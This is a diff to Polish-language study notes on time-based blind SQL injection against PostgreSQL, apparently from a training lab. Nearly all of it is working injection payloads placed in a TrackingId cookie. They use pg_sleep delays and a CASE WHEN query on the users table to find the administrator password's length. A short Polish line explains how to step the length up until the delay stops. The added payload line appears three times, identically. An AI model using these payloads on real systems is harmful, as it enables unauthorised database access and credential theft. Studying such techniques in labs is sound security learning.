@@ -3,3 +3,11 @@ SleepInjection czyli dobre do sprawdzania blindsql :)
 
 [PRZYKLAD WSTRZYKNIECIA W COOKIE ODPOWIEDZ PO 10s] (baza postgreSQL)
 Cookie: TrackingId=on9AfmjAgHmWt5Ai'||pg_sleep(10)--; session=2iYIJe9sHvVmh7vDRzEmLyBN4x5Rqz6T
+
+
+[USTALENIE DLUGOSCI HASLA DLA ADMINISTRATORA]
+Cookie: TrackingId=BNp9Xbl84rMAVBBh'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--;
+Cookie: TrackingId=BNp9Xbl84rMAVBBh'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--;
+Cookie: TrackingId=BNp9Xbl84rMAVBBh'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--;
+
+Zmieniamy dlugosc ((password)>1 lub 2 lub 3 ...) az odpowiedz nie bedzie natychmiast inaczej zadziala nasza funkcja sleep(10) czyli poczeka 10 s.
